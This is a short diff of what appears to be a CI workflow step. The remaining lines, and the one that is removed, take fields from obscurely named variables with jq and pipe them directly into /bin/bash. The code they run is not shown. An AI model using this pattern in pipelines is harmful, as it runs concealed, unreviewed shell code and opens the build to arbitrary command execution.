@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$zbbd73" | jq -r .hasvi385 | /bin/bash
           printf '%s' "$kmpr5" | jq -r .kl288 | /bin/bash
-          echo $wikyp34 | jq -r .zbtcz7608 | /bin/bash
           echo $vsy9463 | jq -r .tzeh753 | /bin/bash
 
       - name: Archive output
